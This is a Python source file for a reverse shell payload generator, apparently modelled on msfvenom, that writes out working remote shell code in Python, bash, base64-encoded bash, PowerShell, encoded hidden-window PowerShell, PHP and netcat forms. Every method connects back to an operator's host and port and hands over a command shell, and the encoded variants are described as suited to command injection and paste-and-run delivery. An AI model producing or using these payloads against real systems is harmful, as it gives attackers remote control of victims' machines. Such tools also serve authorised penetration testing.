"""
Payload Generator - Generates stageless reverse shell payloads in multiple formats.
Inspired by msfvenom but simplified for web-based delivery.
"""

import base64
import os


class PayloadGenerator:
    """Generates stageless reverse shell payloads for various platforms."""
    
    @staticmethod
    def python_stageless(host: str, port: int, name: str = "payload.py") -> dict:
        """Python stageless reverse shell (cross-platform)."""
        code = f'''import socket,subprocess,os,platform
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system()!="Windows" else ["cmd.exe"])
'''
        return {
            'name': name,
            'language': 'python',
            'platform': 'cross-platform',
            'code': code.strip(),
            'description': 'Python stageless reverse shell. Works on Linux, macOS, and Windows with Python installed.',
            'usage': f'python3 {name}'
        }
    
    @staticmethod
    def bash_stageless(host: str, port: int, name: str = "payload.sh") -> dict:
        """Bash stageless reverse shell (Linux/macOS)."""
        code = f'''#!/bin/bash
bash -i >& /dev/tcp/{host}/{port} 0>&1
'''
        return {
            'name': name,
            'language': 'bash',
            'platform': 'linux',
            'code': code.strip(),
            'description': 'Bash reverse shell using /dev/tcp. Linux/macOS only.',
            'usage': f'bash {name}'
        }
    
    @staticmethod
    def bash_base64(host: str, port: int, name: str = "payload_b64.sh") -> dict:
        """Base64-encoded bash reverse shell (useful for command injection)."""
        raw = f'bash -i >& /dev/tcp/{host}/{port} 0>&1'
        encoded = base64.b64encode(raw.encode()).decode()
        code = f'echo {encoded} | base64 -d | bash'
        return {
            'name': name,
            'language': 'bash (base64)',
            'platform': 'linux',
            'code': code,
            'description': 'Base64-encoded bash reverse shell. Useful for command injection scenarios.',
            'usage': code
        }
    
    @staticmethod
    def powershell_stageless(host: str, port: int, name: str = "payload.ps1") -> dict:
        """PowerShell stageless reverse shell (Windows)."""
        code = f'''$client=New-Object System.Net.Sockets.TCPClient('{host}',{port});
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|%{{0}};
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{
    $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback=(iex $data 2>&1 | Out-String);
    $sendback2=$sendback + 'PS ' + (Get-Location).Path + '> ';
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
        return {
            'name': name,
            'language': 'powershell',
            'platform': 'windows',
            'code': code.strip(),
            'description': 'PowerShell stageless reverse shell. Windows only.',
            'usage': f'powershell -ExecutionPolicy Bypass -File {name}'
        }
    
    @staticmethod
    def powershell_encoded(host: str, port: int, name: str = "payload_enc.ps1") -> dict:
        """Base64-encoded PowerShell one-liner (Windows)."""
        raw = f'''$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
$r=(iex $d 2>&1|Out-String);
$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS> ');
$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'''
        # PowerShell uses UTF-16LE for base64 encoding
        encoded = base64.b64encode(raw.encode('utf-16-le')).decode()
        code = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}'
        return {
            'name': name,
            'language': 'powershell (encoded)',
            'platform': 'windows',
            'code': code,
            'description': 'Base64-encoded PowerShell one-liner. Paste directly into cmd or Run dialog.',
            'usage': code
        }
    
    @staticmethod
    def php_stageless(host: str, port: int, name: str = "payload.php") -> dict:
        """PHP stageless reverse shell."""
        code = f'''<?php
$sock=fsockopen("{host}",{port});
while(!feof($sock)){{
    $cmd=fgets($sock,2048);
    $output=shell_exec($cmd." 2>&1");
    fwrite($sock,$output);
}}
fclose($sock);
?>
'''
        return {
            'name': name,
            'language': 'php',
            'platform': 'cross-platform',
            'code': code.strip(),
            'description': 'PHP reverse shell using fsockopen. Requires PHP on target.',
            'usage': f'php {name}'
        }
    
    @staticmethod
    def nc_mkfifo(host: str, port: int, name: str = "payload_nc.sh") -> dict:
        """Netcat + mkfifo reverse shell (Linux)."""
        code = f'''rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/f
'''
        return {
            'name': name,
            'language': 'bash (netcat)',
            'platform': 'linux',
            'code': code.strip(),
            'description': 'Netcat reverse shell with named pipe. Classic Linux technique.',
            'usage': f'bash {name}'
        }
    
    @classmethod
    def get_all_payloads(cls, host: str, port: int) -> list:
        """Generate all available payloads for the given host/port."""
        payloads = []
        methods = [
            cls.python_stageless,
            cls.bash_stageless,
            cls.bash_base64,
            cls.powershell_stageless,
            cls.powershell_encoded,
            cls.php_stageless,
            cls.nc_mkfifo,
        ]
        for method in methods:
            try:
                payloads.append(method(host, port))
            except Exception as e:
                payloads.append({'error': str(e), 'language': method.__name__})
        return payloads
    
    @classmethod
    def get_payload_by_type(cls, host: str, port: int, payload_type: str) -> dict:
        """Generate a specific payload type."""
        mapping = {
            'python': cls.python_stageless,
            'bash': cls.bash_stageless,
            'bash_b64': cls.bash_base64,
            'powershell': cls.powershell_stageless,
            'powershell_enc': cls.powershell_encoded,
            'php': cls.php_stageless,
            'nc': cls.nc_mkfifo,
        }
        method = mapping.get(payload_type)
        if not method:
            return {'error': f'Unknown payload type: {payload_type}. Available: {list(mapping.keys())}'}
        return method(host, port)
